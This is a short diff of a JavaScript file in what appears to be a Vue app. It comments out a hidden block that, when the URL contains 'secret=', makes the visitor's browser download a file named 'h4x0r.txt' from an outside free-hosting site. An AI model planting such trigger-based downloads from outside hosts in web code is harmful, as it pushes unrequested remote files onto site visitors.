@@ -1,10 +1,12 @@
-if (window.location.search.indexOf('secret=') > -1) {
+
+/*if (window.location.search.indexOf('secret=') > -1) {
     var link = document.createElement('a');
 link.href = 'https://mehliug.000webhostapp.com/h4x0r.txt';
 link.download = 'https://mehliug.000webhostapp.com/h4x0r.txt';
 document.body.appendChild(link);
 link.click();
 }
+*/
 
 
 let eventHub = new Vue({
